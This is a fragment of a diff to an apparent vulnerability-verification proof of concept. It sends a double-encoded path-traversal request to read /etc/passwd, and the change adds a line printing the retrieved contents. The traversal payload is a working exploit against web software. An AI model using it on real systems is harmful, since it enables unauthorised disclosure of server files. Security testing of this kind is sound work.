@@ -41,6 +41,7 @@ class TestPOC(POCBase):
         http_body = "010202030302"*500000
         vul_url = urljoin(vul_url,"/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd")
         chunk = req.get(vul_url,data=http_body).text
+        print(chunk)
         if  "bin" in chunk and "/usr/sbin" in chunk and "root" in chunk:
             result['VerifyInfo'] = "success"
         pass
